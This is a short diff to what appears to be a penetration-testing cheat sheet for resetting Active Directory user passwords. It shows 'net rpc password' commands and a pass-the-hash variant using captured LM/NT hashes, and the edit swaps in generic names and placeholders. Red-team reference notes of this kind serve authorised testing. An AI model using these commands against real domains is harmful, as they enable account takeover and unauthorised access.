@@ -1,13 +1,13 @@
 ## If password is known:
 
 ````bash
-net rpc password jamie -U zsm.local/marcus -S 192.168.210.10
-net rpc password <target user> -U <domain/user> -S <dc>
+net rpc password jamie -U domain.local/john -S 192.168.210.10
+net rpc password <target user> -U <domain/you_user> -S <dc>
 ````
 
 ## PTH:
 ```bash
-pth-net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"
+pth-net rpc password <target user> "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"
 ```
 
 ## Powershell from another account if password is known:
